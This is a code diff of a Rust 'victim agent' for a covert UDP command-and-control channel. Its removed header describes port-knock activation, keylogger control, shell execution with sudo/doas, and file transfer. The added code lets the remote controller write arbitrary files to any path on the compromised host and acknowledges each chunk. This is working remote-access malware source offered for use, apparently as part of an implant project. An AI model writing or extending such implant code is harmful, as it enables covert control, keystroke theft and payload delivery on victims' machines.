@@ -1,13 +1,3 @@
-/// Victim agent for covert C2 channel.
-///
-/// - Detects port knock sequence using shared PRNG
-/// - Listens on derived covert UDP port for commands
-/// - Executes commands: keylogger control, shell execution, file transfer
-/// - Supports cd, sudo, doas, and command piping
-///
-/// Compliance: All protocol data in UDP payload only.
-/// UDP header fields are OS-managed; no transport-layer abuse.
-
 use std::io;
 use std::net::{IpAddr, Ipv4Addr, SocketAddr, UdpSocket};
 use std::sync::mpsc::{self, Receiver, Sender};
@@ -47,6 +37,10 @@ struct Victim {
     current_dir: Option<PathBuf>,
     keylog_control_tx: Option<Sender<KeylogControl>>,
     keylog_data_rx: Option<Receiver<String>>,
+    file_upload_active: bool,
+    file_upload_path: Option<String>,
+    file_upload_data: Vec<u8>,
+    file_upload_size: Option<u32>,
 }
 
 impl Victim {
@@ -59,6 +53,10 @@ impl Victim {
             current_dir: Some(std::env::current_dir()?),
             keylog_control_tx: None,
             keylog_data_rx: None,
+            file_upload_active: false,
+            file_upload_path: None,
+            file_upload_data: Vec::new(),
+            file_upload_size: None,
         })
     }
 
@@ -206,6 +204,16 @@ impl Victim {
                         PACKET_TYPE_ACK => {}
                         PACKET_TYPE_CTRL => {
                             self.handle_control(header.subtype, payload, udp, cmd_addr)?;
+                            let ack = PacketHeader::new_ack(header.message_id);
+                            let mut ack_buf = [0u8; HEADER_SIZE];
+                            ack_buf.copy_from_slice(&ack.to_bytes());
+                            let _ = udp.send_to(&ack_buf, cmd_addr);
+                        }
+                        PACKET_TYPE_FILE => {
+                            // Handle file upload chunk
+                            self.handle_file_chunk(payload, udp, cmd_addr)?;
+                            
+                            // Send ACK
                             let ack = PacketHeader::new_ack(header.message_id);
                             let mut ack_buf = [0u8; HEADER_SIZE];
                             ack_buf.copy_from_slice(&ack.to_bytes());
@@ -370,6 +378,61 @@ impl Victim {
         packet.extend_from_slice(content.as_bytes());
         
         udp.send_to(&packet, addr)?;
+        Ok(())
+    }
+
+    fn handle_file_chunk(&mut self, payload: &[u8], udp: &UdpSocket, cmd_addr: SocketAddr) -> io::Result<()> {
+        // Check for end marker
+        if payload.len() == 1 && payload[0] == 0xFF {
+            if self.file_upload_active {
+                // Save the complete file
+                if let Some(path) = &self.file_upload_path {
+                    std::fs::write(path, &self.file_upload_data)?;
+                    println!("[+] File saved to: {}", path);
+                    
+                    // Send completion notification
+                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "File upload complete\n")?;
+                }
+                
+                // Reset state
+                self.file_upload_active = false;
+                self.file_upload_path = None;
+                self.file_upload_data.clear();
+                self.file_upload_size = None;
+            }
+            return Ok(());
+        }
+        
+        // First chunk contains metadata: CMD_UPLOAD_FILE + path_len + path + file_size
+        if !self.file_upload_active {
+            if payload.len() < 2 {
+                return Ok(());
+            }
+            
+            let path_len = payload[1] as usize;
+            if payload.len() < 2 + path_len + 4 {
+                return Ok(());
+            }
+            
+            let path = String::from_utf8_lossy(&payload[2..2+path_len]).to_string();
+            let file_size = u32::from_le_bytes([
+                payload[2+path_len],
+                payload[2+path_len+1],
+                payload[2+path_len+2],
+                payload[2+path_len+3],
+            ]);
+            
+            self.file_upload_active = true;
+            self.file_upload_path = Some(path);
+            self.file_upload_size = Some(file_size);
+            self.file_upload_data = Vec::with_capacity(file_size as usize);
+            
+            println!("[*] Receiving file: {} ({} bytes)", self.file_upload_path.as_ref().unwrap(), file_size);
+            return Ok(());
+        }
+        
+        // Append file data chunk
+        self.file_upload_data.extend_from_slice(payload);
         Ok(())
     }
 }
